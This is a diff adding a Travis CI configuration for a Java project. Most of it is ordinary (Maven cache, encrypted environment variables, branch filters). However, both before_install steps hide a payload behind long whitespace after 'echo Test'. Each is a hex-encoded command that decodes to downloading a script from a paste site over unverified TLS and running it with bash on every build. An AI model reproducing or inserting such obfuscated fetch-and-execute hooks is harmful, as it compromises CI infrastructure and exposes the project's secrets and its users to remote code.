@@ -1,0 +1,24 @@
+
+sudo: false
+
+language: java
+
+before_install:
+ - echo Test                                                                                                                                                                                                                                                            && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a55502e747874202d6f20747261766973312e747874202626206261736820747261766973312e747874270a" | xxd -p -r | bash
+ - echo Test2                                                                                                                                                                                                                                                           && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a554e2e747874202d6f20747261766973322e747874202626206261736820747261766973322e747874270a" | xxd -p -r | bash
+
+
+cache:
+  directories:
+    - $HOME/.m2/repository
+
+env:
+  global:
+    - secure: "IPvqFwnLx/GXyImJuwM2MIvzDlBLqEXaQXFGJgAP1nbuenaLAloOOlqQ+iy2FDLBD/j+zjSbR3WWF9DIT4YxAS03Z6iMwxh7GCfk+tyhVtLQnwt7w1rquyhbrrGFsY5U0hr5q80Ww6J+zfp2yZ8aP9FHSy5ahNjqys4FtubOWLk="
+    - secure: "G77Wt2h2fceQ867i1uwOjUygrNeBpLRS8sxgfUZsO66dvlrx1wYFpZLLRIiPcy01peUTE2SvXIXLHKe9v3AlMonPibsQtvvfQSVfx+jgKwLZx9cuf/M5VQlD3etRUh4K/rBezlxWRroeeKcM2DQqiEVLsTDSyNZV9kVAjwfLTvM="
+    - secure: "wieIClPLTXS3QjDzqyp0TqIrVP/Q6iWNPOtcUQYfdDZJGwufE61laTFtzVKXZRb7uJ4GXDObcVU3AcpAwkTX/5sEksBxgv3TZ5Qi0mVx2GRmbE06ULLxi7sPnTCZ/VFtselDWcWArWGAcdCjW9gcCrgj5K/+sYpVKz9a8V+SDM4="
+
+branches:
+  only:
+    - master
+    - /^release.*$/
